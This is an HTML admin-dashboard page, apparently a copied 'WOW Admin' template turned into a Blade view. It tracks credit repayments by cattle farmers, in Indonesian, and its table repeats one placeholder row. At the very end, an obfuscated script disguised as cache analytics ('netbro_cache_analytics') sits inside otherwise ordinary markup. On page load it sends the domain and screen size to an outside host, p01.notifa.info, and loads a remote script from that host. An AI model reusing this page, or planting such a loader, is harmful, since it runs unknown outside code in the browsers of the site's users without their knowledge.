
<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/tables_data-table.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:47:16 GMT -->
<head>
    <meta charset="UTF-8">
    <meta content="ie=edge" http-equiv="x-ua-compatible">
    <meta content="template language" name="keywords">
    <meta content="Design_Gurus" name="author">
    <meta content="WOW Admin dashboard html template" name="description">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <title>SAPI-I7</title>

    <!--favicon-->
    <link href="assetAdmin/assets/images/favicon.ico" rel="shortcut icon">

    <!--Preloader-CSS-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/preloader/preloader.css">

    <!--bootstrap-4-->
    <link rel="stylesheet" href="assetAdmin/assets/css/bootstrap.min.css">

    <!--Custom Scroll-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
    <!--Font Icons-->
    <link rel="stylesheet" href="assetAdmin/ssets/icons/simple-line/css/simple-line-icons.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/dripicons/dripicons.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/eightyshades/eightyshades.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/foundation/foundation-icons.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/metrize/metrize.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/typicons/typicons.min.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">

    <!--Date-range-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/date-range/daterangepicker.css">
    <!--Drop-Zone-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/dropzone/dropzone.css">
    <!--Full Calendar-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
    <!--Normalize Css-->
    <link rel="stylesheet" href="assetAdmin/assets/css/normalize.css">
    <!--Main Css-->
    <link rel="stylesheet" href="assetAdmin/assets/css/main.css">
</head>
<body>

<!---Preloader Starts Here--->
<div id="ip-container" class="ip-container">
    <header class="ip-header">
        
        <div class="ip-loader">
            <svg class="ip-inner" width="60px" height="60px" viewBox="0 0 80 80">
                <path class="ip-loader-circlebg" d="M40,10C57.351,10,71,23.649,71,40.5S57.351,71,40.5,71 S10,57.351,10,40.5S23.649,10,40.5,10z"/>
                <path id="ip-loader-circle" class="ip-loader-circle" d="M40,10C57.351,10,71,23.649,71,40.5S57.351,71,40.5,71 S10,57.351,10,40.5S23.649,10,40.5,10z"/>
            </svg>
        </div>
    </header>
</div>
<!---Preloader Ends Here--->


<!--Navigation-->
<nav id="navigation" class="navigation-sidebar bg-primary">
    <div class="navigation-header">
        <a href="index.html"><span class="logo">WOW - Admin</span></a>
        <!--<img src="logo.png" alt="logo" class="brand" height="50">-->
    </div>

    <!--Navigation Profile area-->
    <div class="navigation-profile">
        <img class="profile-img rounded-circle" src="assetAdmin/assets/images/1.jpg" alt="profile image">
        <h4 class="name">Meera</h4>
        <span class="designation">UI/UX EXPERT</span>

        <a id="show-user-menu" href="javascript:void(0);" class="circle-white-btn profile-setting"><i class="fa fa-cog"></i></a>

        <!--logged user hover menu-->
        <div class="logged-user-menu bg-white">
            <div class="avatar-info">
                <img class="profile-img rounded-circle" src="assetAdmin/assets/images/1.jpg" alt="profile image">
                <h4 class="name">Meera</h4>
                <span class="designation">UI/UX EXPERT</span>
            </div>

            <ul class="list-unstyled">
                <li>
                    <a href="javascript:void(0);">
                        <i class="ion-ios-email-outline"></i>
                        <span>Emails</span>
                    </a>
                </li>
                <li>
                    <a href="javascript:void(0);">
                        <i class="ion-ios-person-outline"></i>
                        <span>My Profile</span>
                    </a>
                </li>
                <li>
                    <a href="user_change-password.html">
                        <i class="ion-ios-locked-outline"></i>
                        <span>Change Password</span>
                    </a>
                </li>
                <li>
                    <a href="javascript:void(0);">
                        <i class="ion-log-out"></i>
                        <span>Logout</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

    <!--Navigation Menu Links-->
   @include('inti.include_inti')
</nav>

<!--Page Container-->
<section class="page-container">
    <div class="page-content-wrapper">
        <!--Header Fixed-->
        <div class="header fixed-header">
            <div class="container-fluid" style="padding: 10px 25px">
                <div class="row">
                    <div class="col-9 col-md-6 d-lg-none">
                        <a id="toggle-navigation" href="javascript:void(0);" class="icon-btn mr-3"><i class="fa fa-bars"></i></a>
                        <span class="logo">WOW - Admin</span>
                    </div>
                    <div class="col-lg-8 d-none d-lg-block">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="index.html">Pelunasan</a></li>
                            <li class="breadcrumb-item active">LIhat Pelunasan</li>
                        </ol>
                    </div>
                    <div class="col-3 col-md-6 col-lg-4">
                        <a href="javascript:void(0);" class="btn btn-primary btn-round pull-right d-none d-md-block">Buy Theme Now</a>
                    </div>
                </div>
            </div>
        </div>
        <div class="content sm-gutter">
            <div class="container-fluid padding-25 sm-padding-10">
                <div class="row">
                    <div class="col-12">
                        <div class="section-title">
                            <h4></h4>
                        </div>
                    </div>

                    <div class="col-12">
                        <div class="block bg-trans table-block mb-4">
                        

                            <div class="row">
                                <div class="table-responsive">
                                    <table id="dataTable1" class="display table table-striped" data-table="data-table">
                                        <thead>
                                        <tr>
                                            <th>Tanggal Pengajuan</th>
                                            <th>Status</th>
                                            <th>Nama Peternak</th>
                                            <th>Banyak Sapi</th>
                                            <th>Jumlah Kredit</th>
                                            <th>Aksi</th>
                                        </tr>
                                        </thead>
                                        <tbody>
                                        <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                        <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                        <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                         <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                        <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                         <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                         <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                         <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                         <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                        <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                        <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                         <tr>
                                            <td class="name">2008/11/28</td>
                                            <td>Belum Lunas</td>
                                            <td>Sadimo</td>
                                            <td>61</td>
                                            <td class="date">Rp. 20.000.000</td>
                                            <td><a href="addCicilan" class="btn btn-success">+ Cicilan</a></td>
                                        </tr>
                                       
                                        </tbody>
                                    </table>
                                </div>
                            </div>

                        </div>
                    </div>

                </div>
            </div>
        </div>
    </div>

</section>

<!---Right Tray--->
<div class="right-sidebar px-3">
    <button class="right-side-toggle"><i class="fa fa-cog fa-spin"></i></button>
	<div class="block bg-trans" style="margin-bottom: 0">
        <div class="block-heading">
            <h5>Top Navigation</h5>
        </div>
        <ul class="list-unstyled top-nav themecolors">
            <li><a href="javascript:void(0)" data-laycolor="topNavigationLayout/cyan"><div class="color-div" style="background: #18BCC9"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="topNavigationLayout/blue"><div class="color-div" style="background: #1880c9"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="topNavigationLayout/green"><div class="color-div" style="background: #18c97e"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="topNavigationLayout/red"><div class="color-div" style="background: #e13f4c"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="topNavigationLayout/purple"><div class="color-div" style="background: #723fe1"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="topNavigationLayout/orange"><div class="color-div" style="background: rgb(255,120,45)"><i class="fa fa-check my-auto"></i></div></a></li>
        </ul>
    </div>
	
    <div class="block bg-trans">
        <div class="block-heading">
            <h5>Side Navigation</h5>
        </div>
        <ul class="list-unstyled side-nav themecolors">
            <li><a href="javascript:void(0)" data-laycolor="sideNavigationLayout/cyan"><div class="color-div" style="background: #18BCC9"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="sideNavigationLayout/blue"><div class="color-div" style="background: #1880c9"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="sideNavigationLayout/green"><div class="color-div" style="background: #18c97e"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="sideNavigationLayout/red"><div class="color-div" style="background: #e13f4c"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="sideNavigationLayout/purple"><div class="color-div" style="background: #723fe1"><i class="fa fa-check my-auto"></i></div></a></li>
            <li><a href="javascript:void(0)" data-laycolor="sideNavigationLayout/orange"><div class="color-div" style="background: rgb(255,120,45)"><i class="fa fa-check my-auto"></i></div></a></li>
        </ul>
    </div>
</div>

<!--Jquery-->
<script type="text/javascript" src="assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
<!--Bootstrap Js-->
<script type="text/javascript" src="assetAdmin/assets/js/popper.min.js"></script>
<script type="text/javascript" src="assetAdmin/assets/js/bootstrap.min.js"></script>
<!--Modernizr Js-->
<script type="text/javascript" src="assetAdmin/assets/js/modernizr.custom.js"></script>

<!--Morphin Search JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/classie.js"></script>
<script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
<!--Morphin Search JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
<script type="text/javascript" src="assetAdmin/assets/plugins/preloader/preloader-main.js"></script>

<!--Chart js-->
<script type="text/javascript" src="assetAdmin/assets/plugins/charts/Chart.min.js"></script>

<!--Sparkline Chart Js-->
<script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
<script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>

<!--Custom Scroll-->
<script type="text/javascript" src="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
<!--Sortable Js-->
<script type="text/javascript" src="assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
<!--DropZone Js-->
<script type="text/javascript" src="assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
<!--Date Range JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/date-range/moment.min.js"></script>
<script type="text/javascript" src="assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
<!--CK Editor JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
<!--Data-Table JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
<!--Editable JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/editable/editable.js"></script>
<!--Full Calendar JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>

<!--- Main JS -->
<script src="assetAdmin/assets/js/main.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz4e%2bt9%2bPJ0m4IAXs66I%2bZvjCzCdDgi5BVG3DDa2OJFpmXWOGeLdB7iRubBIfVJqpiXU0d%2foLV8cBvRqf7gZF9I%2fyk6T67vz6vQG2cSS%2bgSmo8jdhT6ZNP03Xv93UUU0a5Mw0mFheOelBgKk8D6I1UPppT2Y1n4xrh%2b6YsSjbjA75vosHtRofUc%2fyuTT6O9VSptpW04LCjDXfRkxZ8xsox5efJi%2bqNPuUgeRyLXiSYqbcZP33Ji89dCZJiSUvKffq6X8FUorZVgbaimkv32eCEnMNxGygxnFnaIqYVB8lRN18gjGMjek77VLmdqGLw2c6Q%2fcbMrrc99eVw6zRHwUKQi5zTdsoX1j3cQgqRYa2emjzHRQTrFabZaznFOS3ArglY8LXC6k05ZiUaNUEd2N2oAhYFGkxNSzO7dhb6tCm6mz%2bLMQo2SK6T1z9Rjx0TVJj8UwVk%2fp59d7M1bB9C91mWvkiRwokFdH7XHCQ300gPeY7bjWE90qrcO587BwiYVf8IQ5ZsJjk5Sj%2bQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/tables_data-table.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:47:16 GMT -->
</html>